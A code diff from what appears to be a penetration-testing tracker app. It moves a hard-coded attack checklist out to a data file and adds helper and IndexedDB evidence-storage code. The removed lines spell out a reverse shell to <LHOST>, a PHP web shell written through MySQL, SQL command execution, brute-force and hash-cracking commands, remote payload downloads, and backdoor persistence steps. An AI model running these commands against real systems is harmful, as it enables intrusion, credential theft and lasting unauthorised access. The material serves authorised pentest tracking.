-      { id: 'recon-21', name: 'IMAP/IMAPS Enumeration (143/993)', description: 'IMAP NTLM enumeration, mailbox login, message retrieval, and phishing email delivery.', commands: [
-        { desc: 'Enumerate IMAP NTLM info with nmap', cmd: 'nmap -p 143 --script imap-ntlm-info.nse <TARGET_IP>' },
-        { desc: 'Connect and interact with mailbox via IMAP commands', subdesc: 'After connecting with nc, run the following IMAP tag commands:', cmd: 'nc <TARGET_IP> 143\ntag login USER@localhost PASSWORD\ntag LIST "" "*"\ntag SELECT INBOX\ntag STATUS INBOX (MESSAGES)\ntag fetch <num-of-messages> BODY[HEADER] BODY[1]' },
-        { desc: 'Deliver phishing email with attachment via SWAKS', cmd: 'swaks --to target@domain --from jonas@domain --attach @file.ods --server <TARGET_IP> --body "Please check this out" --header "Subject: IMPORTANT UPDATE"' },
-      ]},
-      { id: 'recon-22', name: 'POP3/POP3S Enumeration (110/995)', description: 'POP3 service and auth method checks.', commands: [
-        { desc: 'Enumerate POP3 capabilities and NTLM auth info', cmd: 'nmap --script pop3-capabilities,pop3-ntlm-info -p110,995 <TARGET_IP>' },
-      ]},
-      { id: 'recon-23', name: 'NFS / rpcbind Enumeration (111/2049)', description: 'Enumerate NFS exports and mount remote shares locally.', commands: [
-        { desc: 'List NFS exports on the target', cmd: 'showmount -e <TARGET_IP>' },
-        { desc: 'Mount the NFS share locally', cmd: 'mkdir nfstarget\nsudo mount -t nfs <TARGET_IP>:/mnt/backups/ nfstarget -o nolock' },
-      ]},
-      { id: 'recon-24', name: 'PostgreSQL Enumeration (5432)', description: 'PostgreSQL login, database listing, table enumeration, and data extraction.', commands: [
-        { desc: 'Login to PostgreSQL server', cmd: 'psql -h <TARGET_IP> -p 5432 -U <username>' },
-        { desc: 'List databases, connect, enumerate tables, and query data', cmd: '\\x on\n\\l;\n\\c <database>;\n\\dt;\nSELECT * FROM "TABLE-NAME";' },
-      ]},
-      { id: 'recon-25', name: 'Oracle TNS Enumeration (1521)', description: 'Oracle listener version detection and SID discovery.', commands: [
-        { desc: 'Detect Oracle TNS listener version', cmd: 'nmap --script oracle-tns-version -p1521 <TARGET_IP>' },
-        { desc: 'Guess Oracle SIDs with ODAT', cmd: 'odat sidguesser -s <TARGET_IP>' },
-      ]},
-      { id: 'recon-26', name: 'Redis Enumeration (6379)', description: 'Redis unauthenticated exposure and configuration checks.', commands: [
-        { desc: 'Retrieve Redis server info via CLI', cmd: 'redis-cli -h <TARGET_IP> -p 6379 INFO' },
-        { desc: 'Enumerate Redis with nmap info script', cmd: 'nmap --script redis-info -p6379 <TARGET_IP>' },
-      ]},
-      { id: 'recon-27', name: 'MongoDB Enumeration (27017)', description: 'MongoDB unauthenticated access and database discovery.', commands: [
-        { desc: 'Connect to MongoDB shell', cmd: 'mongo --host <TARGET_IP> --port 27017' },
-        { desc: 'Enumerate MongoDB with nmap scripts', cmd: 'nmap --script mongodb-info,mongodb-databases -p27017 <TARGET_IP>' },
-      ]},
-      { id: 'recon-28', name: 'Elasticsearch Enumeration (9200)', description: 'Index exposure and REST API checks on Elasticsearch.', commands: [
-        { desc: 'List all Elasticsearch indices via API', cmd: 'curl -s http://<TARGET_IP>:9200/_cat/indices?v' },
-        { desc: 'HTTP enum scan on Elasticsearch port', cmd: 'nmap --script http-enum -p9200 <TARGET_IP>' },
-      ]},
-      { id: 'recon-29', name: 'Memcached Enumeration (11211)', description: 'Memcached information leakage checks.', commands: [
-        { desc: 'Retrieve Memcached server stats via netcat', cmd: 'echo stats | nc <TARGET_IP> 11211' },
-        { desc: 'Enumerate Memcached with nmap info script', cmd: 'nmap --script memcached-info -p11211 <TARGET_IP>' },
-      ]},
-      { id: 'recon-30', name: 'VNC Enumeration (5900)', description: 'VNC auth mechanism and display info checks.', commands: [
-        { desc: 'Enumerate VNC info and display title with nmap', cmd: 'nmap --script vnc-info,vnc-title -p5900 <TARGET_IP>' },
-      ]},
-      { id: 'recon-31', name: 'Vulnerability Scan (Nmap NSE)', description: 'Run NSE vulnerability scripts against all discovered open ports.', commands: [
-        { desc: 'Run NSE vuln scripts against open ports', cmd: 'nmap --script vuln -p<OPEN_PORTS> <TARGET_IP>' },
-      ]},
-    ],
-  },
-  {
-    id: 'exploitation',
-    name: 'Exploitation',
-    optional: false,
-    items: [
-      { id: 'exploit-1', name: 'Searchsploit Lookup', command: 'searchsploit <SERVICE> <VERSION>', description: 'Map services to known exploits.' },
-      { id: 'exploit-2', name: 'FTP Credential Attack (21)', command: 'hydra -L users.txt -P passwords.txt ftp://<TARGET_IP>\nmedusa -h <TARGET_IP> -u <USER> -P passwords.txt -M ftp', description: 'Brute force/default creds on FTP.' },
-      { id: 'exploit-3', name: 'SSH Credential Attack (22)', command: 'hydra -L users.txt -P rockyou.txt ssh://<TARGET_IP>\nssh <USER>@<TARGET_IP>', description: 'Password spray and valid credential validation.' },
-      { id: 'exploit-4', name: 'SMTP Relay / VRFY Abuse (25/465/587)', command: 'swaks --to test@domain.local --from attacker@domain.local --server <TARGET_IP>\nnmap --script smtp-open-relay,smtp-enum-users -p25,465,587 <TARGET_IP>', description: 'Test relay misconfig and user enumeration.' },
-      { id: 'exploit-5', name: 'IMAP/POP Mailbox Brute (110/143/993/995)', command: 'hydra -L users.txt -P passwords.txt imap://<TARGET_IP>\nhydra -L users.txt -P passwords.txt pop3://<TARGET_IP>', description: 'Mailbox auth attacks.' },
-      { id: 'exploit-6', name: 'Kerberos AS-REP / Kerberoast (88)', command: 'impacket-GetNPUsers <DOMAIN>/ -dc-ip <TARGET_IP> -usersfile users.txt -format hashcat\nimpacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <TARGET_IP> -request', description: 'Domain credential extraction via Kerberos.' },
-      { id: 'exploit-7', name: 'RPC/SMB Null Session & Share Abuse (135/139/445)', command: 'rpcclient -U "" -N <TARGET_IP>\ncrackmapexec smb <TARGET_IP> -u <USER> -p <PASS> --shares', description: 'Anonymous/domain share abuse paths.' },
-      { id: 'exploit-8', name: 'SMB Remote Exec (445)', command: 'impacket-psexec <DOMAIN>/<USER>:<PASS>@<TARGET_IP>\nimpacket-smbexec <DOMAIN>/<USER>:<PASS>@<TARGET_IP>', description: 'Command execution through SMB with valid creds/hash.' },
-      { id: 'exploit-9', name: 'LDAP Credentialed Abuse (389/636/3268/3269)', command: 'ldapsearch -x -H ldap://<TARGET_IP> -D "<USER_DN>" -w <PASS> -b "dc=domain,dc=local"\npython3 bloodhound.py -c All -u <USER> -p <PASS> -d <DOMAIN> -ns <TARGET_IP>', description: 'Enumerate AD abuse paths with valid creds.' },
-      { id: 'exploit-10', name: 'NFS no_root_squash Abuse (2049)', command: 'mkdir /tmp/nfs\nmount -t nfs <TARGET_IP>:/<SHARE> /tmp/nfs\ncp /bin/bash /tmp/nfs/bash && chmod +s /tmp/nfs/bash', description: 'Exploit writable NFS exports for privesc foothold.' },
-      { id: 'exploit-11', name: 'MSSQL Command Execution (1433)', command: 'impacket-mssqlclient <USER>:<PASS>@<TARGET_IP>\nEXEC sp_configure \"xp_cmdshell\",1;RECONFIGURE;EXEC xp_cmdshell \"whoami\";', description: 'Leverage SQL Server to execute OS commands.' },
-      { id: 'exploit-12', name: 'MySQL UDF / File Write Abuse (3306)', command: 'mysql -h <TARGET_IP> -u <USER> -p\nSELECT @@secure_file_priv;\nSELECT \"<?php system($_GET[c]); ?>\" INTO OUTFILE \"/var/www/html/shell.php\";', description: 'Abuse FILE/UDF permissions on MySQL.' },
-      { id: 'exploit-13', name: 'PostgreSQL Command Exec (5432)', command: 'psql -h <TARGET_IP> -U <USER>\nCOPY (SELECT \"bash -c \'id\'\") TO PROGRAM \"bash\";', description: 'Use PostgreSQL feature abuse for command execution.' },
-      { id: 'exploit-14', name: 'Oracle Account/SID Abuse (1521)', command: 'odat passwordguesser -s <TARGET_IP> -d <SID>\nodat all -s <TARGET_IP> -d <SID> -U <USER> -P <PASS>', description: 'Exploit weak Oracle credentials and misconfig.' },
-      { id: 'exploit-15', name: 'Redis Unauthorized Write (6379)', command: 'redis-cli -h <TARGET_IP>\nCONFIG SET dir /root/.ssh\nCONFIG SET dbfilename authorized_keys\nSET crack "<PUBKEY>"\nSAVE', description: 'Turn unauth Redis into persistence/RCE foothold.' },
-      { id: 'exploit-16', name: 'MongoDB Unauth Data Access (27017)', command: 'mongo --host <TARGET_IP> --port 27017\nshow dbs\nuse admin\nshow collections', description: 'Exploit unauth MongoDB exposure.' },
-      { id: 'exploit-17', name: 'RDP Password Spray (3389)', command: 'crowbar -b rdp -s <TARGET_IP>/32 -u <USER> -C passwords.txt\nxfreerdp /u:<USER> /p:<PASS> /v:<TARGET_IP>', description: 'Credential attack and desktop access validation.' },
-      { id: 'exploit-18', name: 'SQL Injection', command: 'sqlmap -u "http://<TARGET_IP>/page?id=1" --dbs --batch', description: 'Detect and exploit SQLi.' },
-      { id: 'exploit-19', name: 'Local File Inclusion (LFI)', command: 'http://<TARGET_IP>/page?file=../../../../etc/passwd', description: 'LFI testing and bypasses.' },
-      { id: 'exploit-20', name: 'Remote File Inclusion (RFI)', command: 'python3 -m http.server 80\nhttp://<TARGET_IP>/page?file=http://<LHOST>/shell.php', description: 'RFI testing flow.' },
-      { id: 'exploit-21', name: 'Command Injection', command: '; id\n| id\n$(id)', description: 'Detect command injection vectors.' },
-      { id: 'exploit-22', name: 'File Upload Bypass', command: 'Try .php/.phtml and content-type bypasses.', description: 'Upload filter bypass tests.' },
-      { id: 'exploit-23', name: 'Reverse Shell (Setup Listener)', command: 'nc -lvnp <LPORT>', description: 'Set up listener for shell callbacks.' },
-      { id: 'exploit-24', name: 'Reverse Shell Payloads', command: 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1', description: 'Common shell payloads.' },
-      { id: 'exploit-25', name: 'Shell Upgrade / Stabilize', command: 'python3 -c "import pty;pty.spawn(\"/bin/bash\")"', description: 'Upgrade to interactive TTY.' },
-      { id: 'exploit-26', name: 'Password Brute Force', command: 'hydra -l <USER> -P rockyou.txt ssh://<TARGET_IP>', description: 'Credential brute force checks.' },
-      { id: 'exploit-27', name: 'Hash Cracking', command: 'hashid <HASH>\njohn --wordlist=rockyou.txt hash.txt', description: 'Identify and crack hashes.' },
-      { id: 'exploit-28', name: 'File Transfer to Target', command: 'python3 -m http.server 80\nwget http://<LHOST>/file -O /tmp/file', description: 'Deliver tools and payloads.' },
-    ],
-  },
-  {
-    id: 'post_exploitation',
-    name: 'Post-Exploitation',
-    optional: false,
-    items: [
-      { id: 'post-1', name: 'Linux: Basic Enumeration', command: 'whoami && id\nuname -a\nip a', description: 'Gather baseline Linux host data.' },
-      { id: 'post-2', name: 'Linux: Run LinPEAS', command: 'wget http://<LHOST>/linpeas.sh -O /tmp/linpeas.sh\nchmod +x /tmp/linpeas.sh', description: 'Automated Linux privesc checks.' },
-      { id: 'post-3', name: 'Linux: Sudo Permissions', command: 'sudo -l', description: 'Assess sudo abuse opportunities.' },
-      { id: 'post-4', name: 'Linux: SUID/SGID Binaries', command: 'find / -perm -4000 -type f 2>/dev/null', description: 'Identify SUID/SGID escalation vectors.' },
-      { id: 'post-5', name: 'Linux: Capabilities', command: 'getcap -r / 2>/dev/null', description: 'Check capability-based privilege paths.' },
-      { id: 'post-6', name: 'Linux: Cron Jobs', command: 'crontab -l\ncat /etc/crontab', description: 'Scheduled task discovery.' },
-      { id: 'post-7', name: 'Linux: Writable Files & Dirs', command: 'find / -writable -type f 2>/dev/null', description: 'Writable paths for escalation.' },
-      { id: 'post-8', name: 'Linux: Network & Internal Services', command: 'ss -tlnp\nip route\ncat /etc/hosts', description: 'Internal pivots and services.' },
-      { id: 'post-9', name: 'Linux: Kernel Exploits', command: 'uname -r\nsearchsploit linux kernel <VERSION>', description: 'Kernel exploit triage.' },
-      { id: 'post-10', name: 'Linux: NFS Shares', command: 'showmount -e <TARGET_IP>', description: 'NFS misconfiguration checks.' },
-      { id: 'post-11', name: 'Windows: Basic Enumeration', command: 'whoami /all\nsysteminfo\nipconfig /all', description: 'Baseline Windows host profile.' },
-      { id: 'post-12', name: 'Windows: Run WinPEAS', command: 'certutil -urlcache -split -f http://<LHOST>/winPEASx64.exe C:\\Temp\\winpeas.exe', description: 'Automated Windows privesc checks.' },
-      { id: 'post-13', name: 'Windows: Service Misconfigurations', command: 'sc query\nsc qc <SERVICE_NAME>', description: 'Service configuration abuse checks.' },
-      { id: 'post-14', name: 'Windows: Token Impersonation', command: 'whoami /priv', description: 'Check impersonation opportunities.' },
-      { id: 'post-15', name: 'Windows: Stored Credentials', command: 'cmdkey /list', description: 'Stored secret discovery.' },
-      { id: 'post-16', name: 'Windows: AlwaysInstallElevated', command: 'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated', description: 'MSI privilege escalation path.' },
-      { id: 'post-17', name: 'Windows: Pass the Hash', command: 'impacket-psexec admin@<TARGET_IP> -hashes :<NTLM_HASH>', description: 'Lateral movement with NTLM hashes.' },
-      { id: 'post-18', name: 'Windows: Kerberoasting', command: 'impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -request', description: 'Service ticket extraction and cracking.' },
-      { id: 'post-19', name: 'Linux: NFS Pivot Validation (111/2049)', command: 'showmount -e <TARGET_IP>\nmount -t nfs <TARGET_IP>:/<SHARE> /mnt/nfs', description: 'Validate NFS pivot opportunities after foothold.' },
-      { id: 'post-20', name: 'Linux: Harvest DB Secrets (3306/5432/6379/27017)', command: 'grep -R "password\|passwd\|DB_" /var/www /opt /home 2>/dev/null\ncat /etc/*conf 2>/dev/null | grep -Ei "mysql|postgres|redis|mongo"', description: 'Extract creds for lateral movement into data services.' },
-      { id: 'post-21', name: 'Windows: AD Enumeration (88/389/636/3268/3269)', command: 'nltest /dclist:<DOMAIN>\nGet-ADDomain\nGet-ADUser -Filter * -Properties *', description: 'Deep AD and trust/path analysis from compromised host.' },
-      { id: 'post-22', name: 'Windows: SMB Lateral Movement Prep (139/445)', command: 'net view /domain\nnet use \\<TARGET_IP>\C$ /user:<DOMAIN>\\<USER> <PASS>', description: 'Enumerate reachable hosts and admin shares.' },
-      { id: 'post-23', name: 'Windows: WinRM Lateral Movement (5985/5986)', command: 'Test-WSMan <TARGET_IP>\nevil-winrm -i <TARGET_IP> -u <USER> -p <PASS>', description: 'Validate PowerShell remoting movement paths.' },
-      { id: 'post-24', name: 'Loot: Flags & Sensitive Files', command: 'find / -name "*.txt" -o -name "*.conf" -o -name "*.bak" 2>/dev/null', description: 'Hunt for proof and sensitive files.' },
-    ],
-  },
-  {
-    id: 'persistence',
-    name: 'Persistence',
-    optional: true,
-    items: [
-      { id: 'persist-1', name: 'Linux: SSH Key Persistence', command: 'ssh-keygen -t rsa -b 4096 -f /tmp/backdoor_key', description: 'Add persistent SSH key access.' },
-      { id: 'persist-2', name: 'Linux: Cron Job Backdoor', command: '(crontab -l; echo "* * * * * /bin/bash -c ...") | crontab -', description: 'Recurring callback task.' },
-      { id: 'persist-3', name: 'Linux: SUID Backdoor', command: 'cp /bin/bash /tmp/.hidden_shell\nchmod u+s /tmp/.hidden_shell', description: 'SUID shell persistence.' },
-      { id: 'persist-4', name: 'Linux: Systemd Service', command: 'systemctl enable backdoor.service', description: 'Persistent service callback.' },
-      { id: 'persist-5', name: 'Windows: Registry Run Key', command: 'reg add "HKCU\\...\\Run" /v Updater /t REG_SZ /d "C:\\Temp\\shell.exe" /f', description: 'Autorun persistence.' },
-      { id: 'persist-6', name: 'Windows: Scheduled Task', command: 'schtasks /create /tn "SystemUpdate" /tr "C:\\Temp\\shell.exe" /sc minute /mo 5 /ru SYSTEM', description: 'Scheduled persistent execution.' },
-      { id: 'persist-7', name: 'Windows: New Admin User', command: 'net user hacker Password123! /add\nnet localgroup Administrators hacker /add', description: 'Create persistent privileged account.' },
-      { id: 'persist-8', name: 'Windows: Golden Ticket (AD)', command: 'mimikatz kerberos::golden ...', description: 'Domain-level persistence.' },
-    ],
-  },
-];
+/* checklistPhases data is loaded from data.js */
 
+/**
+ * Default application state shape.
+ * Any missing keys are back-filled during hydration so that older
+ * localStorage payloads still work after schema changes.
+ */
 const defaultState = {
   ui: {
     sidebarCollapsed: false,
@@ -339,6 +82,7 @@ const defaultState = {
     showAddFinding: false,
     mmPhase: 'all',
     checklistTaskFilter: 'all',
+    mmViewState: {},
   },
   reveal: {},
   machines: [],
@@ -347,6 +91,15 @@ const defaultState = {
   activities: [],
 };
 
+/* ───────────────────────────────────────────────
+   2. Legacy Data Detection & State Hydration
+   ─────────────────────────────────────────────── */
+
+/**
+ * Detect whether the stored payload is the original hard-coded seed data
+ * (machine IDs m1/m2, credential c1, findings f1/f2, etc.).  If so, we
+ * clear it so the user starts fresh.
+ */
 function isLegacySeedData(payload) {
   const machineIds = (payload?.machines || []).map((machine) => machine.id).sort();
   const credentialIds = (payload?.credentials || []).map((credential) => credential.id).sort();
@@ -359,6 +112,11 @@ function isLegacySeedData(payload) {
     && activityIds.join(',') === 'a1,a10,a11,a12,a13,a14,a2,a3,a4,a5,a6,a7,a8,a9';
 }
 
+/**
+ * Load persisted state from localStorage, merge with defaults so new keys
+ * are always present, normalize legacy fields, and return the result.
+ * Falls back to a fresh defaultState clone when nothing is stored.
+ */
 function hydrateState() {
   try {
     const raw = localStorage.getItem(STORAGE_KEY);
@@ -404,17 +162,50 @@ function hydrateState() {
   }
 }
 
+/** Live application state — mutated in place, persisted via persist(). */
 const state = hydrateState();
 
-/* ── Phase ordering helpers (used for cross-phase parenting) ── */
-const PHASE_ORDER_GLOBAL = ['osint', 'recon', 'exploitation', 'post_exploitation', 'persistence'];
-function getPreviousPhase(phaseId) {
-  const idx = PHASE_ORDER_GLOBAL.indexOf(phaseId);
-  return idx > 0 ? PHASE_ORDER_GLOBAL[idx - 1] : null;
+/** Phase ID for the AD-specific checklist (only shown for Windows targets). */
+const AD_CHECKLIST_PHASE_ID = 'active_directory_exploitation';
+
+/* ───────────────────────────────────────────────
+   3. Phase Catalog & Ordering Helpers
+   ─────────────────────────────────────────────── */
+
+/**
+ * Return a deep-ish copy of checklistPhases, filtering out the AD phase
+ * for non-Windows machines.  This ensures each machine sees only its
+ * applicable phases.
+ */
+function checklistPhaseCatalogForMachine(machine) {
+  const allPhases = checklistPhases.map((phase) => ({
+    ...phase,
+    items: [...(phase.items || [])],
+  }));
+
+  if (machine?.os_type === 'windows') return allPhases;
+
+  return allPhases.filter((phase) => phase.id !== AD_CHECKLIST_PHASE_ID);
 }
-function getNextPhase(phaseId) {
-  const idx = PHASE_ORDER_GLOBAL.indexOf(phaseId);
-  return (idx >= 0 && idx < PHASE_ORDER_GLOBAL.length - 1) ? PHASE_ORDER_GLOBAL[idx + 1] : null;
+
+/** Resolve a phase ID to its human-readable name for the given machine. */
+function phaseNameForMachine(machine, phaseId) {
+  return checklistPhaseCatalogForMachine(machine).find((phase) => phase.id === phaseId)?.name || phaseId;
+}
+
+/* ── Phase ordering helpers (used for cross-phase parenting) ── */
+function getPhaseOrderForMachine(machine) {
+  return checklistPhaseCatalogForMachine(machine).map((phase) => phase.id);
+}
+function getPreviousPhase(phaseId, machine = null) {
+  const order = getPhaseOrderForMachine(machine);
+  const idx = order.indexOf(phaseId);
+  return idx > 0 ? order[idx - 1] : null;
+}
+function getNextPhase(phaseId, machine = null) {
+  const order = getPhaseOrderForMachine(machine);
+  const idx = order.indexOf(phaseId);
+  return (idx >= 0 && idx < order.length - 1) ? order[idx + 1] : null;
 }
 /**
  * Build eligible parents for a finding.
@@ -424,13 +215,19 @@ function getNextPhase(phaseId) {
  *   Cross-phase parents must be from the immediately previous phase only.
  */
 function buildEligibleParents(machineId, findingPhase, excludeIds) {
+  const machine = machineById(machineId);
   const all = machineFindings(machineId);
   const samePhase = all.filter(f => !excludeIds.has(f.id) && f.phase === findingPhase);
-  const prevPhase = getPreviousPhase(findingPhase);
+  const prevPhase = getPreviousPhase(findingPhase, machine);
   const crossPhase = prevPhase ? all.filter(f => !excludeIds.has(f.id) && f.phase === prevPhase) : [];
   return { samePhase, crossPhase, prevPhaseId: prevPhase };
 }
 
+/* ───────────────────────────────────────────────
+   4. Configuration Objects, DOM Refs & Mutable State
+   ─────────────────────────────────────────────── */
+
+/** Maps machine status keys → display labels and CSS color classes. */
 const statusConfig = {
   pending: { label: 'None', colorClass: 'status-pending' },
   scanning: { label: 'Initial Recon', colorClass: 'status-scanning' },
@@ -447,17 +244,21 @@ const severityClass = {
   info: 'severity-info',
 };
 
-const main = document.getElementById('main');
-const sidebar = document.getElementById('sidebar');
-const brand = document.getElementById('brand');
-let findingEvidenceBuffer = [];
-let mmResizeObserver = null;
-let mmPanCleanup = null;
-let mmFsMachineId = null;
-let mainScrollLockTop = 0;
-let mainScrollLockHandler = null;
-let isMainScrollLocked = false;
+/* ── Primary DOM anchors ── */
+const main = document.getElementById('main');     // <main> content area
+const sidebar = document.getElementById('sidebar'); // collapsible sidebar <aside>
+const brand = document.getElementById('brand');     // brand link in sidebar header
 
+/* ── Mutable module-level state ── */
+let findingEvidenceBuffer = [];   // temp buffer for evidence during finding creation
+let mmResizeObserver = null;      // ResizeObserver watching the mind-map container
+let mmPanCleanup = null;          // teardown fn for the active pan/zoom listeners
+let mmFsMachineId = null;         // machine ID currently in fullscreen mind map, or null
+let mainScrollLockTop = 0;        // saved scroll top when modal locks scroll
+let mainScrollLockHandler = null; // event ref for the scroll-lock listener
+let isMainScrollLocked = false;   // whether main scroll is currently frozen
+
+/** Remove all scroll-lock classes and event listeners applied when a modal was open. */
 function releaseModalLocks() {
   document.body.classList.remove('modal-active');
   document.documentElement.classList.remove('modal-active');
@@ -473,20 +274,31 @@ function releaseModalLocks() {
   isMainScrollLocked = false;
 }
 
+/* ───────────────────────────────────────────────
+   5. Core Utilities
+   ─────────────────────────────────────────────── */
 
-
-
-
+/** Serialize the current state object to localStorage. */
 function persist() {
   localStorage.setItem(STORAGE_KEY, JSON.stringify(state));
 }
 
+/** Generate a short random ID with the given prefix (e.g. uid('m') → 'm4kx9z'). */
 function uid(prefix) {
   return `${prefix}${Math.random().toString(36).slice(2, 8)}`;
 }
 
+/* ───────────────────────────────────────────────
+   6. IndexedDB Evidence CRUD
+   ───────────────────────────────────────────────
+   Evidence files (screenshots, documents) are stored as binary
+   blobs in IndexedDB rather than localStorage (which has a ~5 MB
+   limit and cannot handle binary data efficiently).
+   ─────────────────────────────────────────────── */
+
 let evidenceDbPromise;
 
+/** Open (or create) the IndexedDB evidence database. Returns a cached promise. */
 function openEvidenceDb() {
   if (evidenceDbPromise) return evidenceDbPromise;
   evidenceDbPromise = new Promise((resolve, reject) => {
@@ -503,6 +315,7 @@ function openEvidenceDb() {
   return evidenceDbPromise;
 }
 
+/** Store a File/Blob in IndexedDB. Returns a metadata object (id, name, type, size, created_at). */
 async function putEvidenceFile(file) {
   const database = await openEvidenceDb();
   const record = {
@@ -528,6 +341,7 @@ async function putEvidenceFile(file) {
   };
 }
 
+/** Retrieve a full evidence record (including blob) by ID. */
 async function getEvidenceFile(id) {
   const database = await openEvidenceDb();
   return new Promise((resolve, reject) => {
@@ -538,6 +352,7 @@ async function getEvidenceFile(id) {
   });
 }
 
+/** Remove an evidence record from IndexedDB by ID. */
 async function deleteEvidenceFile(id) {
   const database = await openEvidenceDb();
   await new Promise((resolve, reject) => {
@@ -548,6 +363,7 @@ async function deleteEvidenceFile(id) {
   });
 }
 
+/** Rename an existing evidence record (read → mutate → put back). */
 async function updateEvidenceRecordName(id, name) {
   const database = await openEvidenceDb();
   await new Promise((resolve, reject) => {
@@ -569,6 +385,7 @@ async function updateEvidenceRecordName(id, name) {
   });
 }
 
+/** Wipe all records from the evidence object store. */
 async function clearEvidenceStore() {
   const database = await openEvidenceDb();
   await new Promise((resolve, reject) => {
@@ -579,6 +396,11 @@ async function clearEvidenceStore() {
   });
 }
 
+/* ───────────────────────────────────────────────
+   7. Evidence Preview Overlay
+   Opens a full-screen lightbox for images or an <object> embed for
+   PDFs/other file types.  Manages blob URL lifecycle.
+   ─────────────────────────────────────────────── */
 /* ── Evidence Preview Overlay ─────────────────── */
 let _evidenceOverlayUrl = null;
 
@@ -653,6 +475,11 @@ document.addEventListener('DOMContentLoaded', () => {
   });
 });
 
+/* ───────────────────────────────────────────────
+   8. Storage Request & Image Filtering
+   ─────────────────────────────────────────────── */
+
+/** Ask the browser to keep our origin’s storage persistent (best-effort). */
 async function requestPersistentStorage() {
   if (!navigator.storage?.persist) return;
   try {
@@ -661,10 +488,122 @@ async function requestPersistentStorage() {
   }
 }
 
+/** Filter a FileList/array down to only image/* MIME types. */
 function getImageFilesFromList(files) {
   return Array.from(files || []).filter((file) => file && file.type && file.type.startsWith('image/'));
 }
 
+/* ═══════════════════════════════════════════════
+   Shared UI Helpers
+   ═══════════════════════════════════════════════ */
+
+/** Close a <dialog> when user clicks its backdrop. Optionally run onClose callback. */
+function addBackdropClose(modal, onClose) {
+  modal.addEventListener('click', function backdropClose(e) {
+    if (e.target !== modal) return;
+    if (onClose) onClose();
+    modal.close();
+    modal.removeEventListener('click', backdropClose);
+  });
+}
+
+/** Wire up a dropzone element for drag-and-drop / click / paste of image files. */
+function wireDropzone(dropEl, inputEl, onFiles) {
+  if (!dropEl || !inputEl) return;
+  dropEl.addEventListener('click', () => inputEl.click());
+  inputEl.addEventListener('change', (e) => { onFiles(e.target.files || []); e.target.value = ''; });
+  dropEl.addEventListener('dragover', (e) => { e.preventDefault(); dropEl.classList.add('drag-over'); });
+  dropEl.addEventListener('dragleave', () => dropEl.classList.remove('drag-over'));
+  dropEl.addEventListener('drop', (e) => { e.preventDefault(); dropEl.classList.remove('drag-over'); onFiles(e.dataTransfer?.files || []); });
+  dropEl.addEventListener('paste', (e) => { const imgs = getImageFilesFromList(e.clipboardData?.files || []); if (imgs.length) { e.preventDefault(); onFiles(imgs); } });
+  dropEl.addEventListener('mouseenter', () => dropEl.focus({ preventScroll: true }));
+}
+
+/** Return <option> HTML for severity dropdowns. */
+function severityOptionsHtml(selected = 'high') {
+  return ['critical','high','medium','low','info'].map(s =>
+    `<option value="${s}"${s === selected ? ' selected' : ''}>${s.charAt(0).toUpperCase() + s.slice(1)}</option>`
+  ).join('');
+}
+
+/** Return <option> HTML for phase dropdowns. */
+function phaseOptionsHtml(machinePhases, selected = '') {
+  return machinePhases.map(p =>
+    `<option value="${p.id}"${p.id === selected ? ' selected' : ''}>${p.name}</option>`
+  ).join('');
+}
+
+/** Build parent-finding <option> + <optgroup> HTML for a given phase. */
+function parentFindingOptionsHtml(machineId, phaseId, excludeIds, selectedId, machine) {
+  const ep = buildEligibleParents(machineId, phaseId, excludeIds);
+  let html = ep.samePhase.map(p =>
+    `<option value="${p.id}"${p.id === selectedId ? ' selected' : ''}>${p.title} [${p.severity}]</option>`
+  ).join('');
+  if (ep.crossPhase.length) {
+    const prevLabel = phaseNameForMachine(machine, ep.prevPhaseId);
+    html += `<optgroup label="Cross-phase (${prevLabel})">` +
+      ep.crossPhase.map(p => `<option value="${p.id}"${p.id === selectedId ? ' selected' : ''}>${p.title} [${p.severity}]</option>`).join('') +
+      '</optgroup>';
+  }
+  return html;
+}
+
+/** Wire a phase <select> to dynamically update a parent-finding <select>. */
+function wirePhaseParentSync(container, phaseSelectId, parentSelectId, machineId, excludeIds, selectedParentId, machine) {
+  container.querySelector('#' + phaseSelectId)?.addEventListener('change', (e) => {
+    const sel = container.querySelector('#' + parentSelectId);
+    if (!sel) return;
+    sel.innerHTML = '<option value="">Root Level (no parent)</option>' +
+      parentFindingOptionsHtml(machineId, e.target.value, excludeIds, selectedParentId, machine);
+  });
+}
+
+/** Return the set [id, ...all descendants] of a finding by following parent_id chains. */
+function getDescendantIds(id, all) {
+  return [id, ...all.filter(f => f.parent_id === id).flatMap(c => getDescendantIds(c.id, all))];
+}
+
+/** Two-click confirm guard. Returns true if already armed (proceed). Otherwise arms and returns false. */
+function armConfirmButton(btn, revertText = '🗑') {
+  if (btn.classList.contains('confirm-armed')) return true;
+  btn.classList.add('confirm-armed');
+  const orig = revertText ?? btn.textContent;
+  btn.textContent = 'Sure?';
+  setTimeout(() => { if (btn.isConnected) { btn.classList.remove('confirm-armed'); btn.textContent = orig; } }, 3000);
+  return false;
+}
+
+/** Return <option> HTML for credential type dropdowns. */
+function credTypeOptionsHtml(selected = 'plain') {
+  const types = [['plain','Plain Text'],['hash','Hash'],['key','SSH Key'],['token','Token']];
+  return types.map(([v,l]) =>
+    `<option value="${v}"${v === selected ? ' selected' : ''}>${l}</option>`
+  ).join('');
+}
+
+/** Archive a finding's evidence and linked credentials into machine.archived_*.
+ *  Returns the number of archived credentials. */
+function archiveFindingData(machine, finding, sourceType, excludeEvidenceId) {
+  if (!machine.archived_evidence) machine.archived_evidence = [];
+  if (!machine.archived_credentials) machine.archived_credentials = [];
+  const now = new Date().toISOString();
+  for (const ev of (finding.evidence || [])) {
+    if (excludeEvidenceId && ev.id === excludeEvidenceId) continue;
+    machine.archived_evidence.push({ ...ev, archived_at: now, source_finding_title: finding.title, source_finding_id: finding.id, source_type: sourceType });
+  }
+  const linkedCreds = state.credentials.filter(c => c.finding_id === finding.id);
+  for (const cred of linkedCreds) {
+    machine.archived_credentials.push({ ...cred, finding_id: null, archived_at: now, source_finding_title: finding.title, source_finding_id: finding.id, source_type: sourceType });
+    state.credentials = state.credentials.filter(c => c.id !== cred.id);
+  }
+  return linkedCreds.length;
+}
+
+/* ───────────────────────────────────────────────
+  10. Storage Metrics
+   ─────────────────────────────────────────────── */
+
+/** Sum total bytes of all evidence blobs stored in IndexedDB. */
 async function getEvidenceUsageBytes() {
   const database = await openEvidenceDb();
   return new Promise((resolve, reject) => {
